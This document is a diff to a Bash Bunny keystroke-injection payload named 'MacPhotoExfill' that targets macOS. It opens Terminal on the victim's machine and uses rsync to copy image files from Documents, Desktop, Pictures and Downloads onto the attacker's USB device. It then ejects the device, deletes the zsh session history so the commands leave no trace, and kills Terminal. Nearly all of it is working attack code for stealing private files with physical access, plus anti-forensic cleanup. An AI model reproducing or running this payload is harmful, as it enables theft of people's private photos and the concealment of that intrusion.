@@ -2,7 +2,7 @@
 #
 # Title:         MacPhotoExfill
 # Author:        afsh4ck
-# Version:       1.0
+# Version:       1.1
 # Target:        MacOS
 # Category:      Exfiltration
 #
@@ -27,7 +27,7 @@ QUACK STRING terminal
 QUACK ENTER
 QUACK DELAY 2000
 
-LED ATTACK
+LED STAGE 1
 
 QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Documents;
 QUACK ENTER
@@ -37,33 +37,50 @@ QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Pictures;
 QUACK ENTER
 QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Downloads;
 QUACK ENTER
-QUACK STRING cp Documents/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Documents ;
+QUACK STRING rsync -av Documents/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Documents ;
 QUACK ENTER
-QUACK STRING cp Desktop/*.{png,jpg,jpeg} /Volumes/BashBunny/$lootdir/Desktop ;
+QUACK STRING echo "Please wait while the files are copied...";
 QUACK ENTER
-QUACK STRING cp Pictures/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Pictures ;
+QUACK STRING wait;
 QUACK ENTER
-QUACK STRING cp Downloads/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Downloads ;
+QUACK STRING rsync -av Desktop/*.{png,jpg,jpeg} /Volumes/BashBunny/$lootdir/Desktop ;
 QUACK ENTER
-# We can control the time for the payload execution
-QUACK DELAY 25000
-QUACK CTRL C
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+QUACK STRING rsync -av Pictures/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Pictures ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+QUACK STRING rsync -av Downloads/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Downloads ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+
+# Ensure sincronization
+sync
+
 # Cleanup and delete proofs
-LED M SLOW
+LED STAGE 2
 QUACK ENTER
-QUACK ENTER
+
 # Eject BB storage
 QUACK STRING diskutil eject /Volumes/BashBunny/
 QUACK ENTER
 QUACK DELAY 500
+
 # Remove terminal history from current session (commands used in attack won't be visible with the history command)
 QUACK STRING rm -r ~/.zsh_sessions
 QUACK ENTER
 QUACK DELAY 500
+
 # Exit terminal
 QUACK STRING killall Terminal
 QUACK ENTER
-# Ensure sincronization
-sync
 
 LED FINISH
